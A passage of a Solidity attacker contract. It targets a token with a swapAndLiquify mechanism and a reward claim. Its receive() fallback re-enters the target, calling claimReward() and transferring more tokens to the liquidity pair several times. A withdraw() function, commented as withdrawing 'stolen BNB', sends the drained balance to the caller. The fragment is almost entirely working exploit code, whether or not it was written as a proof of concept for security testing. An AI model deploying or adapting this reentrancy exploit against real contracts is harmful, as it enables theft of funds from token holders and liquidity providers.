        // Transfer to pair (simulating a sell)
        // This will trigger _transfer which may call swapAndLiquify
        target.transfer(pair, balance / 2);
    }

    receive() external payable {
        if (!attacking && msg.sender == address(target)) {
            attacking = true;
            reentrancyCount++;

            // Try to claim rewards multiple times
            if (reentrancyCount < 3) {
                // Claim reward if we have any
                target.claimReward();

                // Try to trigger another swapAndLiquify by transferring more tokens
                uint256 balance = target.balanceOf(address(this));
                if (balance > 0) {
                    target.transfer(pair, balance / 2);
                }
            }

            attacking = false;
        }
    }

    // Function to withdraw stolen BNB
    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}

